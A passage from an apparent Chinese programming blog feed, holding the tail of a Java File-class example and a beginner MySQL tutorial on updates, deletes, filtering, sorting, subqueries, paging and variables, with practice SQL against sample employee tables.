class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;D:\\JAVAText\\src\\列车牵引计算\\计算牵引质量\\Mass.java&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;文件名：&quot;</span> + file3.getName());<br>        <span class="hljs-comment">//判断是否是一个文件</span><br>        System.out.println(file3.isFile()); <span class="hljs-comment">//true</span><br>        <span class="hljs-comment">//判断是否是一个目录</span><br>        System.out.println(file3.isDirectory()); <span class="hljs-comment">//false</span><br><br>        <span class="hljs-comment">//获取文件最后修改时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">longTime</span> <span class="hljs-operator">=</span> file3.lastModified();<br>        <span class="hljs-comment">//创建Date对象，并传入longtime，创建SimpleDateFormat方法(将毫秒化为时分秒的形式)</span><br>        <span class="hljs-type">Date</span> <span class="hljs-variable">time</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(longTime);<br>        <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">sp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss SSSS&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;最后修改时间：&quot;</span> + sp.format(time));<br><br>        <span class="hljs-comment">//获取文件大小</span><br>        System.out.println(file3.length());<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileTExt02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;D:\\JavaStudy\\src\\javaIoText&quot;</span>);<br><br>        <span class="hljs-comment">//获取当前路径下的子文件</span><br>        File[] files = file.listFiles();<br>        <span class="hljs-keyword">for</span>(File flie : files)&#123;<br>            System.out.println(file.getAbsoluteFile());  <span class="hljs-comment">//--&gt;获取路径（返回此抽象路径名的绝对形式）</span><br>            <span class="hljs-comment">//System.out.println(flie.getName()); //文件名</span><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSe</tag>
      
      <tag>IO流</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQL---基础02</title>
    <link href="/2020/06/08/MySQL---%E5%9F%BA%E7%A1%8002/"/>
    <url>/2020/06/08/MySQL---%E5%9F%BA%E7%A1%8002/</url>
    
    <content type="html"><![CDATA[<h3 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h3><h4 id="1、简单修改"><a href="#1、简单修改" class="headerlink" title="1、简单修改"></a>1、简单修改</h4><blockquote><p>  语法：</p><p>  update 表名</p><p>  set 列 &#x3D; 新值,列 &#x3D; 值,…</p><p>  where 筛选条件;</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#将姓名为周的学生电话换成“166666666”<br>UPDATE beauty<br>SET phone = &#x27;1666666666&#x27;<br>WHERE NAME LIKE &#x27;周%&#x27;;<br></code></pre></td></tr></table></figure><blockquote><p>  修改多表记录</p><p>  语法：</p><p>  SQL99语法</p><p>  update 表1 别名</p><p>  inner&#x2F;left&#x2F;right join 表2 别名</p><p>  on 连接条件</p><p>  set 列 &#x3D; 新值,列 &#x3D; 值,…</p><p>  where 筛选条件;</p><p>  SQL92语法</p><p>  update 表1 别名,表2 别名</p><p>  set 列 &#x3D; 新值,列 &#x3D; 值,…</p><p>  where 连接条件</p><p>  and 筛选条件;</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#修改张无忌的女朋友的手机号为114<br>UPDATE boys b<br>INNER JOIN beauty be<br>ON b.`id` = be.`boyfriend_id`<br>SET phone = &#x27;114&#x27;<br>WHERE b.`boyName` = &#x27;张无忌&#x27;;<br></code></pre></td></tr></table></figure><h4 id="2、删除"><a href="#2、删除" class="headerlink" title="2、删除"></a>2、删除</h4><blockquote><p>  语法</p><p>  方式一：</p><p>   1.单表的删除</p><pre><code class="hljs">delete from 表名 where 筛选条件</code></pre><p>   2.多表的删除</p><pre><code class="hljs">SQL92</code></pre><p>  ​delete 别名(删除表1写表1别名，删除表2写表2别名，删除两个表就写两个表的别名)</p><p>  ​from 表1 别名,表2 别名</p><p>  ​where 连接条件</p><p>  ​and 筛选条件;</p><p>  ​SQL99语法</p><p>  ​delete 别名(删除表1写表1别名，删除表2写表2别名，删除两个表就写两个表的别名)</p><p>  ​from 表1 别名</p><p>  ​inner&#x2F;left&#x2F;right join 表2 别名 </p><p>  ​on 连接条件</p><p>  ​where 筛选条件;</p><p>   方式二：</p><pre><code class="hljs">truncate table 表名; </code></pre></blockquote><ul><li><p>注意：</p><ul><li><p>delete与truncate 的区别：</p><ul><li><p>1.delete可以加where条件，truncate不能加</p></li><li><p>2.truncate删除效率较高</p></li><li><p>3.假如要删除表中有自增长列，如果用delete删除后，再插入数据，自增长列的值从断点开始，而truncate删除后,再插入数据，自增长列的值从1开始</p></li></ul></li></ul></li><li><p>4.truncate删除没有返回值，delete删除有返回值</p></li><li><p>5.truncate删除不能回滚，delete删除可以回滚</p></li></ul><h4 id="3、模糊查询"><a href="#3、模糊查询" class="headerlink" title="3、模糊查询"></a>3、模糊查询</h4><blockquote><p>  like：</p><p>  ​与通配符进行使用</p><p>  ​“% “:任意多个字符</p><p>  ​“_”(下划线):任意单个字符</p><p>  between…..and….：</p><p>  ​可以提高语句简洁度</p><p>  ​包含临界值等价于大于等于&#x2F;小于等于</p><p>  ​两个临界值不能颠倒</p><p>  in ：</p><p>  ​含义：判断某字段的值是否属于in列表中的某一项</p><p>  ​特点：</p><p>  ​使用in提高语句简洁度</p><p>  ​in列表的值类型必须统一或兼容</p><p>  ​is null &#x2F; is not null</p><p>  ​&#x3D;&#x2F;&lt;&gt;不能用于判断null值</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#查询员工名中带有字符a的员工信息<br>SELECT *<br>FROM<br>employees<br>WHERE<br>last_name LIKE &#x27;%a%&#x27;;<br><br>#查询员工名中带有字符_的员工信息<br>SELECT *<br>FROM <br>employees<br>WHERE <br>last_name LIKE &#x27;_\_%&#x27;;<br><br>#查询员工编号在100到120之间的员工信息<br>SELECT *<br>FROM employees<br>WHERE department_id BETWEEN 100 AND 200;<br><br>#查询员工工种编号AC_ACCOUNT AC_MGR &#x27;AD_VP&#x27;,&#x27;FI_ACCOUNT&#x27;中的一个员工名和工种编号<br>SELECT <br>last_name,job_id<br>FROM <br>employees<br>WHERE<br>job_id IN (&#x27;AC_ACCOUNT&#x27;,&#x27;AC_MGR&#x27;,&#x27;AD_VP&#x27;,&#x27;FI_ACCOUNT&#x27;);<br><br>#查询没有奖金/有奖金的员工名和奖金率<br>SELECT <br>last_name,commission_pct<br>FROM<br>employees<br>WHERE <br>#commission_pct is not null; 没有奖金<br>#commission_pct &lt;=&gt; null; ----&lt;=&gt;安全等于<br>`commission_pct`IS NULL;  #有奖金<br><br></code></pre></td></tr></table></figure><h4 id="4、排序查询"><a href="#4、排序查询" class="headerlink" title="4、排序查询"></a>4、排序查询</h4><blockquote><p>  语法：</p><p>  select 查询列表</p><p>  from 表</p><p>  [where 筛选条件]</p><p>  order by 排序列表 [asc | desc]</p><p>  特点：</p><p>  ​1.asc：默认按升序排列可以不写</p><p>  ​2.desc：按降序排列</p><p>  ​3.order by 子句中可以支持单个字段，多个字段，表达式，函数，别名</p><p>  ​4.order by 子句一般是放在查询语句的最后面，但是limit子句除外</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#查询员工信息，按工资从高到底顺序/从低到高顺序查询<br>SELECT * FROM employees ORDER BY salary DESC;<br>SELECT * FROM employees ORDER BY salary ;<br><br>#查询部门编号&gt;=90的员工信息，按入职时间先后进行排序<br>SELECT *<br>FROM employees<br>WHERE <br>`department_id` &gt;= 90 <br>ORDER  BY hiredate;<br><br>#按年薪的高低显示员工的信息和年薪（按表达式排序）<br>SELECT * , salary * 12 * (1 + IFNULL(commission_pct,0)) AS 年薪<br>FROM employees<br>ORDER BY salary * 12 * (1 + IFNULL(commission_pct,0));<br><br>#按年薪的高低显示员工的信息和年薪（按别名排序）<br>SELECT * , salary * 12 * (1 + IFNULL(commission_pct,0)) AS 年薪<br>FROM employees<br>ORDER BY 年薪;<br><br>#按last_name中的字符长度排序（按函数排序）<br>SELECT  last_name, LENGTH(last_name) AS 名字长度<br>FROM employees<br>ORDER BY LENGTH(last_name)  DESC;<br><br>#查询员工信息，工资升序，员工编号降序(按多个字段排序)<br>SELECT * <br>FROM employees<br>ORDER BY salary ASC,manager_id DESC;<br><br>#查询员工的姓名，部门和年薪，按年薪降序，姓名升序排序<br>SELECT last_name,job_id,12 * salary *(1 + IFNULL (commission_pct,0)) AS 年薪<br>FROM employees<br>ORDER BY 年薪 DESC,last_name ASC;<br><br>#查询工资不在8000-17000的员工的姓名和工资，按工资降序排序<br>SELECTlast_name,salary<br>FROM employees<br>WHERE <br>salary &lt; 8000 OR salary &gt; 17000<br>ORDER BY salary DESC;<br><br>#查询邮箱中包含e的员工信息，并按邮箱字节数降序再按部门号升序<br>SELECT * , LENGTH(email) AS 邮箱字节数<br>FROM employees<br>WHERE <br>email LIKE(&#x27;%e%&#x27;)<br>ORDER BY 邮箱字节数 DESC , manager_id;<br><br></code></pre></td></tr></table></figure><h4 id="5、练习"><a href="#5、练习" class="headerlink" title="5、练习"></a>5、练习</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br></pre></td><td class="code"><pre><code class="hljs mysql">/*<br>1.创建表dept1<br>Name Null? Type<br>id          int(7)<br>name        varchar(25)<br><br>2.将表departments中的数据插入新表dept2中<br><br>3.创建表emp5<br>Name        Null?   Type<br>id                  int(7)<br>First_name          varchar(25)<br>Last_name           varchar(25)<br><br>4.将列Last_name的长度增加到50<br><br>5.根据表employees创建表employees2<br><br>6.删除表emp5<br><br>7.将表employees2重命名为emp5<br><br>8.在表dept和emp5中添加新列test_column<br><br>9.直接删除表emp5中的列dept_id<br>*/<br><br>#1.创建表<br>USE myemployees;<br>CREATE TABLE detp1(<br>    id INT(7),<br>    NAME VARCHAR(25)<br>);<br><br>#2<br>USE myemployees;<br>CREATE TABLE dept2<br>SELECT *<br>FROM departments;<br><br>#3.创建表emp5<br>USE myemployees;<br>CREATE TABLE emp5(<br>    id INT(7),<br>    First_name VARCHAR(25),<br>    Last_name VARCHAR(25)<br>);<br><br>#4.<br>ALTER TABLE emp5 MODIFY COLUMN Last_name VARCHAR(50);<br><br>#5.<br>USE myemployees;<br>CREATE TABLE employees2 LIKE employees;<br><br>#6.<br>DROP TABLE emp5;<br> <br>#7.<br>ALTER TABLE employees2<br>RENAME TO emp5;<br><br>#8.<br>ALTER TABLE emp5<br>ADD COLUMN text_column VARCHAR(20);<br><br>#9.<br>ALTER TABLE emp5<br>DROP COLUMN dept_id;<br><br>#查询部门编号&gt;90或邮箱中包含a的员工信息<br>SELECT * <br>FROM employees <br>WHERE department_id &gt; 90<br>UNION<br>SELECT * <br>FROM employees <br>WHERE email LIKE &#x27;%a%&#x27;;<br><br>/*<br>一 插入语句<br>语法：<br>INSERT INTO 表名(列名,列名…...)<br>VALUES(值1，…..)<br>*/<br>SELECT *<br>FROM beauty;<br>#1.插入值的类型要与列的类型一致或兼容<br>INSERT INTO beauty(id,NAME,sex,borndate,phone,photo,boyfriend_id)<br>VALUES(14,&#x27;汤姆&#x27;,&#x27;男&#x27;,&#x27;1999-5-6&#x27;,&#x27;18649662222&#x27;,NULL,6);<br><br>#第二种插入<br>INSERT INTO beauty<br>SET id = 15,NAME = &#x27;爱因斯坦&#x27;,sex = &#x27;男&#x27;,phone = &#x27;8794565&#x27;;<br><br>/*<br>修改单表记录<br>语法：<br>update 表名<br>set 列 = 新值,列 = 值,…<br>where 筛选条件;<br>*/<br><br>#将姓名为周的学生电话换成“166666666”<br>UPDATE beauty<br>SET phone = &#x27;1666666666&#x27;<br>WHERE NAME LIKE &#x27;周%&#x27;;<br><br>/*<br>修改多表记录<br>语法：<br>SQL99语法<br>update 表1 别名<br>inner/left/right join 表2 别名<br>on 连接条件<br>set 列 = 新值,列 = 值,…<br>where 筛选条件;<br><br>SQL92语法<br>update 表1 别名,表2 别名<br>set 列 = 新值,列 = 值,…<br>where 连接条件<br>and 筛选条件;<br>*/<br>#修改张无忌的女朋友的手机号为114<br>UPDATE boys b<br>INNER JOIN beauty be<br>ON b.`id` = be.`boyfriend_id`<br>SET phone = &#x27;114&#x27;<br>WHERE b.`boyName` = &#x27;张无忌&#x27;;<br><br>/*<br>删除语句<br>语法<br>  方式一：<br>    1.单表的删除<br>    delete from 表名 where 筛选条件<br>    2.多表的删除<br>    SQL92<br>delete  别名(删除表1写表1别名，删除表2写表2别名，删除两个表就写两个表的别名)<br>from 表1 别名,表2 别名<br>where 连接条件<br>and 筛选条件;<br><br>    SQL99语法<br>delete  别名(删除表1写表1别名，删除表2写表2别名，删除两个表就写两个表的别名)<br>from 表1 别名<br>inner/left/right join 表2 别名 <br>on 连接条件<br>where 筛选条件;<br><br>  方式二：<br>    truncate table 表名;    <br>*/<br><br>#单表删除<br>#删除手机号结尾为9的信息<br>DELETE FROM beauty <br>WHERE phone LIKE &#x27;%9&#x27;;<br><br>#多表删除<br>#删除有关张无忌的信息<br>DELETE b<br>FROM beauty b<br>INNER JOIN boys bo<br>ON b.`boyfriend_id` = bo.`id`<br>WHERE bo.`boyName` = &#x27;张无忌&#x27;;<br><br>#案例一：查询谁的工资比Abel高？<br>/*<br>1.查询Abel的工资<br>2.查询员工的信息，筛选salary &gt; 1的结果<br>*/<br>SELECT salary<br>FROM employees<br>WHERE last_name = &#x27;Abel&#x27;;<br><br>SELECT *<br>FROM employees<br>WHERE salary &gt; (<br>SELECT salary<br>FROM employees<br>WHERE last_name = &#x27;Abel&#x27;<br>);<br><br>#案例2：返回job_id与141号员工相同并且salary比143号员工多的员工姓名，job_id,salary<br>/*<br>1.查询141号员工的job_id<br>2.查询工资143号的salary<br>3.查询员工的姓名，job_id和工资，要求job_id=1并且salary&gt;2<br>*/<br>#1.查询141号员工的job_id<br>SELECT job_id<br>FROM employees<br>WHERE employee_id = 141;<br><br>#2.查询工资143号的salary<br>SELECT salary<br>FROM employees<br>WHERE employee_id = 143; <br><br>#3.查询员工的姓名，job_id和工资，要求job_id=1并且salary&gt;2<br>SELECT last_name,job_id,salary<br>FROM employees<br>WHERE job_id = (<br>SELECT job_id<br>FROM employees<br>WHERE employee_id = 141<br>)<br>AND  salary &gt;(<br>SELECT salary<br>FROM employees<br>WHERE employee_id = 143<br>);<br><br>#案例3：返回公司工资最少的员工的last_name,job_id,salary<br>/*<br>1.查询公司的最低工资<br>2.查询last_name,job_id,salary 要求salary=1<br>*/<br>SELECT MIN(salary)<br>FROM employees;<br><br>SELECT last_name,job_id,salary<br>FROM employees<br>WHERE salary = (<br>SELECT MIN(salary)<br>FROM employees<br>);<br><br>#案例4：查询最低工资大于50号部门最低工资的部门id和其最低工资<br>/*<br>1.查询50号部门的最低工资<br>2.查询每个部门的最低工资<br>3.再2的基础上筛选2 满足最低工资 &gt; 1的结果 <br>*/<br>SELECT MIN(salary)<br>FROM employees<br>WHERE department_id = 50;<br><br>SELECT MIN(salary),department_id<br>FROM employees<br>GROUP BY department_id;<br><br>SELECT MIN(salary),department_id<br>FROM employees<br>GROUP BY department_id<br>HAVING MIN(salary) &gt; (<br>SELECT MIN(salary)<br>FROM employees<br>WHERE department_id = 50<br>);<br><br>#列子查询<br>#返回location_id是1400或1700的部门中的所有员工姓名<br>/*<br>1.查询location_id是1400或1700的部门编号<br>2.查询员工姓名，满足部门号是1列表中的某一个<br>*/<br>SELECT DISTINCT department_id<br>FROM departments<br>WHERE location_id IN(1400,1700);<br><br>SELECT last_name<br>FROM employees<br>WHERE department_id IN(<br>SELECT DISTINCT department_id<br>FROM departments<br>WHERE location_id IN(1400,1700)<br>);<br><br>#返回其它工种中比job_id为‘IT_PROG’工种任一工资低的员工的员工号、姓名、job_id 以及salary<br>/*<br>1.查询job_id为‘IT_PROG’部门的工资<br>2.查询员工号、姓名、job_id 以及salary， salary＜１<br>*/<br>SELECT DISTINCT salary<br>FROM employees<br>WHERE job_id = &#x27;IT_PROG&#x27;;<br><br>SELECT last_name,employee_id,job_id,salary<br>FROM employees<br>WHERE salary &lt; ANY(<br>SELECT DISTINCT salary<br>FROM employees<br>WHERE job_id = &#x27;IT_PROG&#x27;<br>)AND job_id &lt;&gt; &#x27;IT_PROG&#x27;;<br><br></code></pre></td></tr></table></figure><h4 id="6、分页查询"><a href="#6、分页查询" class="headerlink" title="6、分页查询"></a>6、分页查询</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs mysql">/**<br>应用场景：<br>当前显示数据一页显示不全，需要分页提交sql请求<br>语法：<br>select 查询列表<br>[连接类型join 表2]<br>limit offset,size<br>offset表示要显示条目的起始索引(从0开始)<br>size要显示的条目个数<br><br>特点：<br>limit语句放在查询语句的最后<br>公式：要显示的页数page 每页的条目数size<br>select 查询列表<br>from 表<br>limit   (page - 1) * size ,size<br>*/<br>#查询前五条员工信息<br>SELECT *<br>FROM employees<br>LIMIT 0,5;<br><br>#查询第11条到第25条员工信息<br>SELECT *<br>FROM employees<br>LIMIT 10,15<br><br></code></pre></td></tr></table></figure><h4 id="7、变量"><a href="#7、变量" class="headerlink" title="7、变量"></a>7、变量</h4><h5 id="7-1、系统变量"><a href="#7-1、系统变量" class="headerlink" title="7.1、系统变量"></a>7.1、系统变量</h5><ul><li><p>变量由系统定义，不是用户定义，属于服务器层面</p></li><li><p>全局变量：针对整个服务器</p></li><li><p>语法：</p><ul><li>show <strong>global</strong> variables</li><li>会话变量：针对客户端的一次连接</li></ul></li><li><p>语法：</p><ul><li>show <strong>session</strong> variables</li></ul></li><li><p>查看满足条件的部分系统变量</p><ul><li>语法：</li><li>show global variables like ‘%char%’;</li></ul></li><li><p>查看指定的某个系统变量的值</p><ul><li>语法：</li><li>select @@系统变量名</li><li>select @@<strong>global&#x2F;session</strong>.系统变量名–查看指定的全局&#x2F;会话的某个系统变量的值</li></ul></li><li><p>为某个系统变量赋值</p><ul><li>set <strong>global&#x2F;session</strong> 系统变量名 &#x3D; 值</li><li>set @@ **global&#x2F;session.**系统变量名 &#x3D; 值</li></ul></li></ul><h5 id="7-2、自定义变量"><a href="#7-2、自定义变量" class="headerlink" title="7.2、自定义变量"></a>7.2、自定义变量</h5><ul><li><p>用户变量</p></li><li><p>作用域：针对当前会话(连接)有效，同于会话变量的作用域</p></li><li><p>1）声明并初始化</p><ul><li>set @用户变量名 &#x3D; 值;</li><li>set @用户变量名：&#x3D; 值;</li><li>select @用户变量名: &#x3D; 值;</li></ul></li><li><p>2）赋值(更新用户变量的值)</p><ul><li>方式一：<ul><li>set @用户变量名 &#x3D; 值;</li><li>set @用户变量名：&#x3D; 值;</li><li>select @用户变量名: &#x3D; 值;</li></ul></li><li>方式二：<ul><li>select 字段 into 变量名</li><li>from 表;</li></ul></li></ul></li><li><p>3)使用</p><ul><li>select @用户变量名;</li></ul></li><li><p><strong>局部变量</strong></p><ul><li>作用域：仅仅在定义的begin end 中有效</li><li>应用：在begin end 中的第一句话</li></ul></li><li><p>1）声明</p><ul><li>declare 变量名 <strong>类型</strong>；</li><li>declare 变量名 <strong>类型</strong> default 值;</li></ul></li><li><p>2）赋值</p><ul><li>方式一：<ul><li>set 局部变量名 &#x3D; 值；</li><li>set 局部变量名：&#x3D; 值;</li><li>select @局部变量名: &#x3D; 值;</li></ul></li></ul></li><li><p>方式二：</p><ul><li>select 字段 into 局部变量名</li><li>from 表;</li></ul></li><li><p>3）使用：</p><ul><li>select 局部变量名;</li></ul></li></ul><h4 id="8、存储过程"><a href="#8、存储过程" class="headerlink" title="8、存储过程"></a>8、存储过程</h4><h5 id="8-1、存储过程"><a href="#8-1、存储过程" class="headerlink" 